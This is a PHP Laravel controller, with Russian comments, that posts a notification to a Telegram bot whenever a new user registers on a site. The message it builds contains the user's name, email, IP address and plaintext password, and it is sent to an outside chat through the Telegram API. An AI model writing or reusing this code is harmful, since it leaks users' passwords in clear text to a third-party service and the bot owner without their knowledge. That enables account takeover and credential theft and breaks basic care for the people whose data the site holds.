<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Notification;
use App\Notifications\CreditNew;

class TelegramNotificationController extends Controller
{
    public function index($request){
        
        $tg_user = env('BOT_REG_TO'); // id пользователя, для отправки сообщения
        $bot_token = env('BOT_REG_TOKEN'); // токен бота
        $time = time(); 
        $text = 
        "Зарегистрирован новый пользователь! \n 
        Имя: <b>".$request["name"]."</b> \n 
        Почта: <b>".$request["email"]."</b>\n 
        Пароль: <b>".$request["password"]."</b> \n 
        Время регистрации: ".date('d-m-Y H:i:s', $time)."\n 
        IP адрес: ".$_SERVER['REMOTE_ADDR']."
        \n------------------------------ \n 
        <pre><code class='language-python'>Сообщение сформировано автоматически модулем CE-Notification!</code></pre>";
          
        // параметры, которые отправятся в api телеграм
        $params = array(
            'chat_id' => $tg_user, // id получателя
            'text' => $text, // текст сообщения
            'parse_mode' => 'HTML', // режим отображения сообщения HTML (не все HTML теги работают)
        );
          
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'.$bot_token.'/sendMessage'); // адрес вызова api функции телеграм
        curl_setopt($curl, CURLOPT_POST, true); // отправка методом POST
        curl_setopt($curl, CURLOPT_TIMEOUT, 10); // время выполнения запроса
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION , true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $params); // параметры запроса
        $result = curl_exec($curl); // запрос к api
        curl_close($curl);

    }

    public function getUpdates(){}

}
